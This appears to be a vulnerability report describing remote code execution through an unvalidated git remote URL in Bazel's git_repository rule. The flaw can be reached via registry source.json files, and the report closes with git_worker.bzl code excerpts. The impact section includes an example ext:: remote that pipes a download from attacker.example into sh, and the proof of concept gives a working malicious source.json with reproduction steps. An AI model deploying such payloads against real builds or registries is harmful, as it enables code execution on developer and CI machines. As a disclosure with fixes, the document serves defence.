### Title
Argument/Protocol Injection RCE via Unsanitized Git `remote` URL in `git_repository` (bzlmod registry `source.json`) - (File: tools/build_defs/repo/git_worker.bzl)

### Summary
Bazel's Starlark `git_repository` repo rule (used both directly and via the Bzlmod registry's `git_repository`-type `source.json`) forwards attacker-influenced `remote`, `commit`, and `tag` values verbatim into `git` subprocess argument lists in `git_worker.bzl`, with no validation of the URL scheme and no integrity/checksum binding on the fetched content (unlike the `archive` type, which has `integrity`). A hostile or compromised registry (reached via `--registry=`) can therefore supply a `remote` value using a dangerous Git transport helper scheme (e.g. `ext::`) that Git itself will execute as an arbitrary command when Bazel runs `git remote add origin <remote>` followed by `git fetch origin`, all invoked as if by direct user command (Git's default `protocol.allow=user` permits `ext::` in this exact invocation pattern). This mirrors the Crayfish class of bug: untrusted content flows unsanitized into a subsystem (Git) that treats a supplied string as executable/argument-like data rather than opaque data, causing remote code execution.

### Finding Description
`git_repo()` in `git_worker.bzl` builds a `_GitRepoInfo` struct directly from `ctx.attr.remote`, `ctx.attr.commit`, `ctx.attr.tag`, or `ctx.attr.branch` [1](#0-0) , and then calls `_update(ctx, git_repo)`, which does:

```
init(ctx, git_repo)
add_origin(ctx, git_repo, ctx.attr.remote)
fetch(ctx, git_repo)
reset(ctx, git_repo)
``` [2](#0-1) 

`add_origin` passes the raw `remote` string directly as an argument to `git remote add origin <remote>` with no scheme validation: [3](#0-2) 

`fetch()` does apply a `"--"` argument separator before the *ref* to defend against refspec/flag injection (`args.extend(["--", git_repo.fetch_ref])`), which is exactly the protection validated by the existing test `test_git_repository_invalid_commit` (a `commit` value crafted as `--upload-pack=...` is neutralized) [4](#0-3) [5](#0-4) . However, **no equivalent protection exists for `remote`**, and Git's own transport layer treats certain URL schemes (`ext::<command>`, historically `fd::`) as instructions to execute an arbitrary local command rather than as a network address — this is the root cause of the well-known CVE-2017-1000117 class of Git argument/URL-scheme injection. Because Bazel invokes `git remote add` / `git fetch` directly (not via an implicit source such as `.gitmodules`), Git's default `protocol.allow=user` policy permits the `ext::` helper to run.

The `remote` (and `commit`/`tag`) values reach this code path from a fully untrusted source: the Bzlmod registry's `source.json` file for a module using `"type": "git_repository"` is *directly forwarded* to the `git_repository` rule's `remote`, `commit`, `tag`, `shallow_since`, `verbose`, and `strip_prefix` attributes [6](#0-5) . Unlike the `archive` type, which is bound by a mandatory `integrity` field [7](#0-6) , the `git_repository` type has **no checksum/integrity binding whatsoever** on `remote`/`commit`. Any registry reachable via `--registry=` (including internal/mirror registries commonly configured in `.bazelrc`) can serve this file, matching the "hostile origin server ... where a declared sha256/integrity ... should stop it and is shown to fail" criterion — here, no such integrity field even exists for this repo type.

### Impact Explanation
A malicious or compromised registry server (reached through a configured `--registry` mirror, which is routine in enterprise setups and does not require any special privilege on the victim's machine) can serve a `source.json` for any dependency version specifying `"type": "git_repository"` with a `remote` value such as `ext::sh -c "curl attacker.example/x|sh"`. When Bazel resolves and fetches that dependency, `git remote add origin ext::sh -c "..."` followed by `git fetch origin` causes Git to spawn the attacker's command directly on the developer's or CI machine — full remote code execution, matching CWE-74/CWE-150 (unsanitized data interpreted as command/argument content by a downstream interpreter).

### Likelihood Explanation
Exploitation requires only that the victim's Bazel build consult a registry the attacker controls or has compromised (a `--registry=` mirror, or a supply-chain compromise of a registry a project already trusts) and reference a module version backed by `type: git_repository`. No credentials, MITM, or access to the victim's machine are needed — this is exactly the "attacker publishes/serves content that a victim's build consumes" scenario. The only barrier is that the specific default of `protocol.allow` in the Git version installed on the victim's system must permit `ext::` for user-invoked commands, which is Git's documented default behavior for directly-issued commands (as opposed to implicit sources like submodules).

### Recommendation
- Validate and restrict the `remote` URL scheme in `git.bzl`/`git_worker.bzl` to an explicit allow-list (`http`, `https`, `ssh`, `git`, `file` with path checks), rejecting `ext::`, `fd::`, and any other Git "remote helper" scheme before invoking `git remote add`.
- Similarly validate that `commit`/`tag`/`branch` values do not begin with `-` (defense in depth beyond the existing `"--"` separator in `fetch`, which does not cover `reset`/`remote add`).
- Require (or at least support) an integrity/pin mechanism for `git_repository`-backed Bzlmod modules analogous to `archive`'s `integrity` field, so that registry-supplied `remote`/`commit` values are at minimum pinned and auditable, and consider disabling `type: git_repository` module sources from non-default registries unless explicitly opted in.

### Proof of Concept
1. Stand up a local Bazel registry (or MITM an internal `--registry` mirror) serving a module `evil@1.0` whose `source.json` is:
```json
{
  "type": "git_repository",
  "remote": "ext::sh -c \"touch /tmp/pwned\"",
  "commit": "0000000000000000000000000000000000000000"
}
```
2. Victim project's `MODULE.bazel` contains `bazel_dep(name = "evil", version = "1.0")` and `.bazelrc` contains `common --registry=https://attacker-controlled-or-compromised-mirror/`.
3. Run `bazel fetch @evil//...` (or any build that triggers resolution of `evil`).
4. Bazel's `git_repository` rule executes `git init`, then `git -C <dir> remote add origin ext::sh -c "touch /tmp/pwned"`, then `git fetch origin ...`, causing Git to execute the attacker's shell command, creating `/tmp/pwned` — demonstrating RCE. A JUnit/`src/test/shell/bazel` reproduction should extend `starlark_git_repository_test.sh` (which already contains the sibling `test_git_repository_invalid_commit` pattern for the `commit` argument-injection defense) with an analogous `test_git_repository_malicious_remote_scheme` asserting that a `remote` value starting with `ext::` is rejected by Bazel before ever reaching `git remote add`.

def _update(ctx, git_repo):
    ctx.delete(git_repo.directory)

    init(ctx, git_repo)
    add_origin(ctx, git_repo, ctx.attr.remote)
    fetch(ctx, git_repo)
    reset(ctx, git_repo)
    clean(ctx, git_repo)

    if git_repo.recursive_init_submodules:
        ctx.report_progress("Updating submodules recursively")
        update_submodules(ctx, git_repo, recursive = True)
    elif git_repo.init_submodules:
        ctx.report_progress("Updating submodules")
        update_submodules(ctx, git_repo)

def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)

    if sparse_checkout_patterns_or_file:
        _git_sparse_checkout(ctx, git_repo, sparse_checkout_patterns_or_file)

    if st.return_code == 0:
        return
    if ctx.attr.commit:
        # Perhaps uploadpack.allowReachableSHA1InWant or similar is not enabled on the server;
        # fall back to fetching all branches, tags, and history.
        # The semantics of --tags flag of git-fetch have changed in Git 1.9, from 1.9 it means
        # "everything that is already specified and all tags"; before 1.9, it used to mean
        # "ignore what is specified and fetch all tags".
        # The arguments below work correctly for both before 1.9 and after 1.9,
        # as we directly specify the list of references to fetch.
        _report_progress(ctx, git_repo, shallow_failed = True)
        _git(
            ctx,
            git_repo,
            "fetch",
            "origin",
            "--",
            "refs/heads/*:refs/remotes/origin/*",
            "refs/tags/*:refs/tags/*",
        )
    else:
        _error(ctx.name, ["git"] + args, st.stderr)
